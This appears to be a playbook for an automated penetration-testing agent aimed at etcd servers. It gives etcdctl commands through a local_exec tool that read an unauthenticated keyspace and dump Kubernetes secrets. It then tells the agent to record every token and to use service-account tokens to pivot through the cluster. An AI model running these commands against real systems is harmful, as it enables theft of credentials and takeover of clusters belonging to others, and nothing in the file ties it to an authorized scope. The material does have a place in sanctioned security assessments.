---
name: etcd
services: [etcd]
summary: etcd — unauthenticated key-value read, Kubernetes secret extraction
---

# etcd playbook

etcd (2379) backs Kubernetes and other systems; unauthenticated read = the entire cluster's
secrets. Use `local_exec`. The commands below are **examples** — compose your own.

## Reach & read
- Example: `local_exec("etcdctl --endpoints http://<host>:2379 get / --prefix --keys-only")`
- Example (k8s secrets): `etcdctl --endpoints http://<host>:2379 get /registry/secrets/ --prefix`

look for: unauthenticated access (critical); service-account tokens and app secrets in the keyspace.

## Record
`record_credential` every token/secret; a Kubernetes SA token → pivot the cluster
(`load_playbook(["kubernetes"])`).
